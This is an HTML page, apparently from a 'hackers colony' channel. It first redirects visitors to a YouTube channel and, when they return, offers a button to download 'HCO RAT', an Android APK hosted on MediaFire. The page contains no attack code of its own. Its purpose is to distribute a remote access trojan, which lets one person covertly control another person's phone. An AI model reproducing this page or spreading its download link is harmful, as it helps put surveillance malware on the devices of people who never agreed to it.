<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HCC | Redirect + Download</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
      flex-direction: column;
    }
    .countdown {
      font-size: 2em;
      margin-bottom: 20px;
    }
    .hidden {
      display: none;
    }
    .btn {
      padding: 15px 30px;
      font-size: 1.2em;
      background: #00c6ff;
      background: linear-gradient(to right, #0072ff, #00c6ff);
      color: white;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
      transition: transform 0.2s ease;
    }
    .btn:hover {
      transform: scale(1.05);
    }
  </style>
</head>
<body>
  <div id="countdownPage">
    <h1>Welcome to HCO Website</h1>
    <p class="countdown">Redirecting in <span id="counter">5</span> seconds...</p>
  </div>

  <div id="downloadPage" class="hidden">
    <h1>Welcome Back!</h1>
    <p>Click below to download HCO RAT</p>
    <button class="btn" onclick="window.location.href='https://www.mediafire.com/file/oghfpaq7rjef928/%25F0%259D%2590%2587%25F0%259D%2590%2582%25F0%259D%2590%258E_%25F0%259D%2590%2591%25F0%259D%2590%2580%25F0%259D%2590%2593_1.0.apk/file'">
      Download HCO RAT
    </button>
  </div>

  <script>
    // Check if user already visited once (coming back from YouTube)
    const visited = sessionStorage.getItem('visitedOnce');

    if (!visited) {
      // First time visit, show countdown and redirect
      let counter = 5;
      const interval = setInterval(() => {
        counter--;
        document.getElementById('counter').innerText = counter;
        if (counter <= 0) {
          clearInterval(interval);
          sessionStorage.setItem('visitedOnce', 'true');
          window.location.href = 'https://youtube.com/@hackers_colony_tech?si=mgIQkRne76fz6_GC';
        }
      }, 1000);
    } else {
      // User came back, show download button
      document.getElementById('countdownPage').classList.add('hidden');
      document.getElementById('downloadPage').classList.remove('hidden');
    }
  </script>
</body>
</html>
